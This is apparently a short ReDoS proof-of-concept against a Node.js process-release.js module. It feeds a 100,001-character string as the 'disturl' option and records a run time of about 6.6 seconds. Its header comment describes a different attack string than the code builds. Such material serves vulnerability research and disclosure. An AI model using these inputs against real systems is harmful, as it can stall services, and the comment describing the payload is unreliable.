const processRelease = require("./process-release.js");

//Attack String :""+"/"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "a";

const gyp = {
  opts: {
    disturl: str,
    target: "",
  },
};
console.log(processRelease("", gyp, "", ""));


//注释了部分与变量无关但尚未到达正则表达式位置的代码

// real    0m6.601s
// user    0m6.569s
// sys     0m0.010s
